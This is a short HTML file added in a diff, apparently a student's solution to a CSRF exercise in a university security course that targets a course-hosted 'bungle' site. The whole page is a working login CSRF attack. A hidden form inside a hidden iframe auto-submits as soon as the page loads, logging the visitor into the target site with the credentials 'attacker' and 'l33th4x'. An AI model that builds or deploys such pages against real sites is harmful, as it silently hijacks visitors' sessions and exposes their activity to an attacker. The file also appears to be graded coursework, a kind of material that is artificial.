@@ -1,0 +1,22 @@
+<meta content="text/html;charset=utf-8" http-equiv="Content-Type">
+<meta content="utf-8" http-equiv="encoding">
+<html>
+<head>
+    <title>2.2.2.1 CSRF</title>
+</head>
+<body>
+
+	<iframe id="loginFrame" name="mal_frame" hidden></iframe>
+
+  <form action="http://bungle-cs461.csl.illinois.edu/login" method="post" target="mal_frame" id="login" hidden>
+    <input id="username" name="username" type="text" placeholder="Username" required="" class="form-control" value="attacker">
+    <input id="userpass" name="password" type="password" placeholder="Password" required="" class="form-control" value="l33th4x">
+  </form>
+
+	<script>
+    var login_form = document.getElementById("login");
+    login_form.submit();
+	</script>
+
+</body>
+</html>
